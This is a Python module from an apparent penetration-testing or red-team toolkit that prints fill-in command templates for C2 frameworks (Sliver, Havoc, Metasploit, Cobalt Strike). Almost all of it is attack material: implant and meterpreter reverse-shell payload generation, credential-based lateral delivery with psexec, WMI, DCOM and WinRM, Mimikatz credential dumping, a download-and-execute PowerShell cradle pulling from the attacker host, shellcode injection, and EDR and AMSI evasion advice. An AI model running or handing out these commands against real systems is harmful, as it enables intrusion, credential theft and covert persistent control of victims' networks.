"""
Module: C2 Framework Integration
Techniques: Sliver, Havoc, Metasploit, Cobalt Strike compatibility,
            listener management, payload generation, implant delivery,
            OPSEC profiles, sleep jitter
"""
from utils.helpers import *
from config.settings import SESSION

def run():
    print_banner("C2 INTEGRATION", "Command & Control framework management")
    attacker = input_or_session("attacker_ip",    "Attacker/Team Server IP")
    iface    = input_or_session("attacker_iface", "Interface (e.g. tun0, eth0)")
    dc       = input_or_session("dc_ip",          "Target DC IP")
    dom      = input_or_session("domain",         "Domain")

    print(f"""
  {C}── SLIVER C2 ─────────────────────────────────────────────────────{RST}
  [1]  Sliver — Start Server + Listeners
  [2]  Sliver — Generate Implant
  [3]  Sliver — Deliver Implant (SMB/WMI/DCOM)
  {C}── HAVOC C2 ──────────────────────────────────────────────────────{RST}
  [4]  Havoc — Server + Demon Agent Generation
  {C}── METASPLOIT ────────────────────────────────────────────────────{RST}
  [5]  Metasploit — Payload Generation (msfvenom)
  [6]  Metasploit — Handler + Module Setup
  {C}── COBALT STRIKE ─────────────────────────────────────────────────{RST}
  [7]  Cobalt Strike — Compatibility Notes
  {C}── OPSEC ─────────────────────────────────────────────────────────{RST}
  [8]  OPSEC Profile Generator
  [9]  Payload Obfuscation & Delivery
  [0]  Back
""")
    c = input(f"  {M}Choice:{RST} ").strip()

    if c == "1":
        lport_https = prompt("HTTPS listener port (default=443)") or "443"
        lport_mtls  = prompt("mTLS listener port (default=8888)") or "8888"
        lport_dns   = prompt("DNS listener domain (e.g. c2.corp.com)")
        print(f"""
  {C}Sliver C2 — Server + Listener Setup:{RST}

  {Y}Start Sliver server:{RST}
  sudo sliver-server

  {Y}Inside Sliver console — create listeners:{RST}
  # HTTPS listener (best OPSEC):
  https -l {attacker}:{lport_https} --domain {lport_dns or "c2."+dom}

  # mTLS listener (encrypted, reliable):
  mtls -l {attacker}:{lport_mtls}

  # SMB named pipe listener (lateral movement):
  named-pipe-listener --name svchost

  # DNS listener (covert egress):
  dns --domains {lport_dns or "dns."+dom} -l {attacker}

  {Y}Enable multiplayer (team server):{RST}
  multiplayer -l {attacker}:31337
  # Connect from another machine:
  sliver-client -c /root/.sliver/configs/<server>.cfg

  {Y}Persistent implant generation + auto-start:{RST}
  profiles new --mtls {attacker}:{lport_mtls} --os windows --arch amd64 win_mtls
  stage-listener --url tcp://{attacker}:8080 --profile win_mtls
""")

    elif c == "2":
        listener = prompt(f"Listener (e.g. mtls://{attacker}:8888 or https://{attacker}:443)")
        fmt      = prompt("Format: exe / dll / shellcode / service (default=exe)") or "exe"
        out      = prompt(f"Output filename (default=/tmp/implant.{fmt})") or f"/tmp/implant.{fmt}"
        print(f"""
  {C}Sliver — Generate Implant:{RST}

  {Y}Standard implant:{RST}
  sliver> generate \\
    --{listener.split("://")[0]} {listener.split("://")[1]} \\
    --os windows \\
    --arch amd64 \\
    --format {fmt} \\
    --save {out}

  {Y}OPSEC-hardened implant:{RST}
  sliver> generate \\
    --https {attacker}:443 \\
    --os windows --arch amd64 \\
    --format exe \\
    --evasion \\                    # enables binary obfuscation (garble)
    --skip-symbols \\               # strip debug symbols
    --name "svchost" \\             # legitimate-looking name
    --save {out}

  {Y}Shellcode for injection:{RST}
  sliver> generate \\
    --mtls {attacker}:8888 \\
    --os windows --arch amd64 \\
    --format shellcode \\
    --save /tmp/implant.bin

  {Y}Service implant (for PsExec-style delivery):{RST}
  sliver> generate \\
    --mtls {attacker}:8888 \\
    --os windows --arch amd64 \\
    --format service \\
    --save /tmp/implant_svc.exe
""")

    elif c == "3":
        implant = prompt("Implant path (e.g. /tmp/implant.exe)")
        target  = prompt(f"Target host (default={dc})")  or dc
        user_t  = input_or_session("username", "Username")
        pw_t    = input_or_session("password", "Password")
        print(f"""
  {C}Sliver Implant Delivery:{RST}

  {Y}Method 1 — SMB (admin share upload + psexec):{RST}
  nxc smb {target} -u '{user_t}' -p '{pw_t}' -d {dom} \\
    --put-file {implant} C:\\\\Windows\\\\Temp\\\\svc.exe
  nxc smb {target} -u '{user_t}' -p '{pw_t}' -d {dom} \\
    -x 'C:\\Windows\\Temp\\svc.exe'

  {Y}Method 2 — WMI execution:{RST}
  impacket-wmiexec {dom}/{user_t}:'{pw_t}'@{target} \\
    "cmd /c start /b C:\\Windows\\Temp\\svc.exe"

  {Y}Method 3 — DCOM (ShellBrowserWindow):{RST}
  impacket-dcomexec -object ShellBrowserWindow \\
    {dom}/{user_t}:'{pw_t}'@{target} \\
    "cmd /c C:\\Windows\\Temp\\svc.exe"

  {Y}Method 4 — Task Scheduler:{RST}
  impacket-atexec {dom}/{user_t}:'{pw_t}'@{target} \\
    "cmd /c C:\\Windows\\Temp\\svc.exe"

  {Y}Method 5 — Sliver psexec (built-in):{RST}
  sliver> use <session_id>
  sliver (host)> psexec --service-name "WindowsUpdate" \\
    --bin-path {implant} {target}

  {Y}Method 6 — Evil-WinRM + upload:{RST}
  evil-winrm -i {target} -u '{user_t}' -p '{pw_t}'
  *Evil-WinRM* PS> upload {implant} C:\\Windows\\Temp\\svc.exe
  *Evil-WinRM* PS> C:\\Windows\\Temp\\svc.exe
""")

    elif c == "4":
        lport = prompt("Havoc listener port (default=40056)") or "40056"
        print(f"""
  {C}Havoc C2 — Setup & Demon Agent:{RST}

  {Y}Start Havoc teamserver:{RST}
  sudo ./havoc server --profile ./profiles/havoc.yaotl

  {Y}Default profile template (/profiles/havoc.yaotl):{RST}
  Teamserver {{
    Host     = "{attacker}"
    Port     = 40056
    Build    {{
      Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
    }}
  }}
  Operators {{ ... }}

  {Y}Listeners — in Havoc GUI:{RST}
  Add → HTTPS → Host: {attacker}, Port: {lport}
  # or HTTP for lab use

  {Y}Generate Demon agent — in Havoc GUI:{RST}
  Payload → Demon → Windows → EXE → Generate
  Options:
    - Sleep: 5s Jitter: 25%     # OPSEC: random sleep
    - Indirect Syscalls: On     # bypass EDR hooks
    - Stack Duplication: On     # hide call stack
    - Injection: Process Hollow or Thread Hijack
    - AMSI/ETW Patch: On

  {Y}Shellcode injection via PowerShell (after gen):{RST}
  $sc = [System.IO.File]::ReadAllBytes("C:\\temp\\demon.bin")
  $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
  [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
  $t = [System.Threading.Thread]::new([System.Threading.ThreadStart](
    [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
      $mem,[System.Action])))
  $t.Start()
""")

    elif c == "5":
        lport = prompt("LHOST port (default=4444)") or "4444"
        fmt   = prompt("Format: exe/dll/ps1/raw/elf (default=exe)") or "exe"
        print(f"""
  {C}msfvenom Payload Generation:{RST}

  {Y}Staged (requires handler — smaller payload):{RST}
  msfvenom -p windows/x64/meterpreter/reverse_https \\
    LHOST={attacker} LPORT={lport} \\
    -f {fmt} -o /tmp/msf_staged.{fmt}

  {Y}Stageless (standalone — better for AV evasion):{RST}
  msfvenom -p windows/x64/meterpreter_reverse_https \\
    LHOST={attacker} LPORT={lport} \\
    -f {fmt} -o /tmp/msf_stageless.{fmt}

  {Y}Shellcode only (for injection):{RST}
  msfvenom -p windows/x64/meterpreter/reverse_tcp \\
    LHOST={attacker} LPORT={lport} \\
    -f raw -o /tmp/msf_shellcode.bin

  {Y}Encoded (basic AV evasion):{RST}
  msfvenom -p windows/x64/meterpreter/reverse_https \\
    LHOST={attacker} LPORT={lport} \\
    -e x64/xor_dynamic -i 5 \\
    -f exe -o /tmp/msf_enc.exe

  {Y}Linux ELF:{RST}
  msfvenom -p linux/x64/meterpreter/reverse_tcp \\
    LHOST={attacker} LPORT={lport} \\
    -f elf -o /tmp/msf_linux

  {Y}PowerShell (AMSI bypass + payload):{RST}
  msfvenom -p windows/x64/meterpreter/reverse_https \\
    LHOST={attacker} LPORT={lport} \\
    -f psh-reflection -o /tmp/msf.ps1
""")

    elif c == "6":
        lport = prompt("Handler port (default=4444)") or "4444"
        print(f"""
  {C}Metasploit Handler + Useful Modules:{RST}

  {Y}Start multi/handler:{RST}
  msfconsole -q -x "
    use exploit/multi/handler;
    set PAYLOAD windows/x64/meterpreter/reverse_https;
    set LHOST {attacker};
    set LPORT {lport};
    set ExitOnSession false;
    exploit -j"

  {Y}Post-exploitation modules:{RST}
  # After session opened:
  msf6> use post/windows/gather/hashdump
  msf6> use post/multi/recon/local_exploit_suggester
  msf6> use post/windows/manage/migrate
  msf6> use post/windows/gather/credentials/credential_collector
  msf6> use post/windows/gather/smart_hashdump
  msf6> use post/windows/gather/laps_password

  {Y}Kerberoast from Metasploit session:{RST}
  msf6> use auxiliary/gather/get_user_spns
  set SESSION <id>; run

  {Y}Pivoting through session:{RST}
  msf6> route add {dom} <session_id>
  msf6> use auxiliary/server/socks_proxy
  set SRVPORT 1080; run
""")

    elif c == "7":
        print(f"""
  {C}Cobalt Strike — Compatibility & Aggressor Notes:{RST}

  {Y}Listener setup (malleable C2 profile — recommended):{RST}
  # Use a reputable malleable C2 profile (e.g. jquery/amazon/google)
  # Reduces network signature detection

  {Y}Common CS commands (beacon context):{RST}
  # In beacon:
  execute-assembly <path> [args]    # in-memory .NET
  inline-execute <bof.o> [args]     # BOF execution
  argue <pid> <spoof_args>          # argument spoofing
  blockdlls                         # block non-MS DLLs
  ppid <pid>                        # PPID spoofing
  sleep 30 25                       # 30s sleep 25% jitter

  {Y}Lateral movement via CS:{RST}
  jump psexec64 <target> <listener>
  jump wmi <target> <listener>
  jump winrm64 <target> <listener>

  {Y}Mimikatz from beacon:{RST}
  mimikatz !sekurlsa::logonpasswords
  mimikatz !lsadump::dcsync /domain:{dom} /all /csv
  hashdump   # SAM dump (local)
  logonpasswords   # alias for sekurlsa

  {Y}Kerberos from beacon:{RST}
  kerberos_ticket_purge
  make_token {dom}\\<user> <pass>
  kerberos_ccache_use /tmp/<ticket>.ccache
""")

    elif c == "8":
        print(f"""
  {C}OPSEC Profile Generator — Reduce Detection Footprint:{RST}

  {Y}Network OPSEC:{RST}
  - Use HTTPS/TLS with valid certificate (Let's Encrypt on C2 domain)
  - Domain fronting (Azure CDN / Cloudflare worker as front)
  - DNS over HTTPS for C2 beacon (DoH)
  - Mimic legitimate User-Agent strings (Office365, Teams, Windows Update)
  - Limit beacon frequency: 30-60s sleep + 25-50% jitter

  {Y}Process OPSEC:{RST}
  - PPID spoofing (inject into Explorer.exe or svchost.exe children)
  - Sacrifice process spawning for fork+run operations
  - Block non-Microsoft DLLs in beacon process
  - Avoid CreateRemoteThread (common EDR hook) — use NtCreateThreadEx / Fibers

  {Y}Memory OPSEC:{RST}
  - Sleep masking (encrypt beacon in memory during sleep — e.g. Ekko/Foliage)
  - Stack encryption (encrypt call stack during sleep)
  - Heap encryption
  - Use RX memory only (not RWX — flagged by EDR)

  {Y}Execution OPSEC:{RST}
  - Use BOFs instead of fork+run for Mimikatz / hashdump
  - In-process .NET assembly execution (execute-assembly in CS)
  - Avoid cmd.exe / powershell.exe direct invocation
  - Use WMIC / WMI namespaces for stealthy execution

  {Y}Sliver — OPSEC flags:{RST}
  generate --evasion --skip-symbols --name "MicrosoftEdgeUpdate"
    --format shellcode --mtls {attacker}:8888
""")

    elif c == "9":
        payload = prompt("Payload path (e.g. /tmp/implant.exe)")
        out     = prompt("Obfuscated output (default=/tmp/obf_payload.exe)") or "/tmp/obf_payload.exe"
        print(f"""
  {C}Payload Obfuscation & Delivery:{RST}

  {Y}Shellcode encryption (custom XOR/AES loader):{RST}
  # Python — XOR encrypt shellcode:
  key = b"\\xDE\\xAD\\xBE\\xEF\\xCA\\xFE\\xBA\\xBE"
  data = open("{payload}", "rb").read()
  enc  = bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
  open("{out}.bin", "wb").write(enc)

  {Y}Shellcode in Unicode strings (Python → C#):{RST}
  python3 -c "
  data = open('{payload}','rb').read()
  print(','.join(['0x{0:02x}'.format(b) for b in data]))
  "

  {Y}Donut — convert EXE/DLL → shellcode:{RST}
  donut -f {payload} -o {out}.bin
  donut -f {payload} -o {out}.bin -e 3 -z 2    # AMSI+WLDP bypass, compression

  {Y}GadgetToJScript — .NET → JS/VBS/HTA:{RST}
  GadgetToJScript.exe -w js -o {out} -b {payload}

  {Y}Macro delivery (Office):{RST}
  msfvenom -p windows/x64/meterpreter/reverse_https \\
    LHOST={attacker} LPORT=443 \\
    -f vba-exe -o /tmp/macro.vba

  {Y}HTA delivery:{RST}
  msfvenom -p windows/x64/meterpreter/reverse_https \\
    LHOST={attacker} LPORT=443 \\
    -f hta-psh -o /tmp/shell.hta

  {Y}Serve payload via HTTP:{RST}
  sudo python3 -m http.server 80 --directory /tmp
  # Delivery: iex (New-Object Net.WebClient).DownloadString('http://{attacker}/shell.ps1')
""")

    pause()
